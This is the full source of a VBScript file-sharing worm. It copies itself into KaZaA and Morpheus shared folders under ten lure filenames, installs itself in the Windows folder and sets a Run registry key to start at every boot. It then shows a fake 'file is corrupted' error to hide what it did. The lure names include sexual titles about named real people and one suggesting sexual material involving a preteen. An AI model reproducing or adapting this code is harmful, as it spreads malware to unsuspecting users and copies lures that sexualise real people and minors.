On Error Resume Next
Dim Wormitz
Dim IGUBGfso,IGUBGws,IGUBGfiles
Dim IGUBGkaz
Dim IGUBGmor
Dim IGUBGbear
Dim IGUBGprfi
Dim IGUBGwrm
Dim IGUBGwin
Dim IGUBGgrok
Set IGUBGfso = CreateObject("Scripting.fileSystemobject")
Set IGUBGws = CreateObject("Wscript.Shell")
Set IGUBGwin = IGUBGfso.GetSpecialFolder(0)
IGUBGwrm = Wscript.ScriptFullName
IGUBGfiles = Array("Windows 2003 Full Downloader","Magic Arena Special Edition 2003","Fsecure Corporate Edition Dual Scanner Cracked","New Video about Bin Laden","Jenna Jameson New Video with Nikky Tyler","Best Lesbian Scene Never Seen","PreTeen dildo.jpg","AvirlLavigne_nude_sex","Demi Moore in bathroom","New Rules to Avoid Kazaa been outlaw")
IGUBGprfi = IGUBGws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
IGUBGkaz = IGUBGprfi & "\KaZaA\My Shared Folder\"
If IGUBGfso.FolderExists(IGUBGkaz) = True Then
For IGUBGcop = 0 To 9
IGUBGfso.copyfile IGUBGwrm,IGUBGkaz &IGUBGfiles(IGUBGcop) & ".vbs"
Next
End If
IGUBGmor = IGUBGprfi & "\Morpheus\My Shared Folder\"
If IGUBGfso.FolderExists(IGUBGmor) = True Then
For IGUBGs = 0 To 9
IGUBGfso.copyfile IGUBGwrm,IGUBGmor &IGUBGfiles(IGUBGs) & ".vbs"
Next
End If
IGUBGfso.copyfile IGUBGwrm, IGUBGwin & "\" & Wscript.ScriptName
IGUBGws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\HellPWG", IGUBGwin & "\" & Wscript.ScriptName
MsgBox "The file is corrupted",0,"Error"
Set IGUBGws = Nothing
Set IGUBGfso = Nothing
